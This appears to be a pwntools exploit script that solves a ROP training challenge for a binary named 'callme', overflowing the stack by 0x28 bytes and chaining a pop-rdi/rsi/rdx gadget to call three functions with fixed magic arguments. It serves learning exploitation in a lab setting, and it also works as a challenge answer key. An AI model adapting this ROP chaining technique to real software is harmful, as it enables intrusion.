from pwn import *
context.binary=exe=ELF("./callme",checksec=False)

p=process(exe.path)
input()
offset=0x28
pop_rdi_rsi_rdx=0x000000000040093c
call_1=0x400720
call_2=0x400740
call_3=0x4006f0
ret=0x00000000004006be
payload=b"A"*offset+p64(ret)+p64(pop_rdi_rsi_rdx)+p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d)
payload+=p64(call_1)
payload+=p64(ret)+p64(pop_rdi_rsi_rdx)+p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d)+p64(call_2)
payload+=p64(ret)+p64(pop_rdi_rsi_rdx)+p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d)+p64(call_3)
p.sendlineafter(b"",payload)

p.interactive()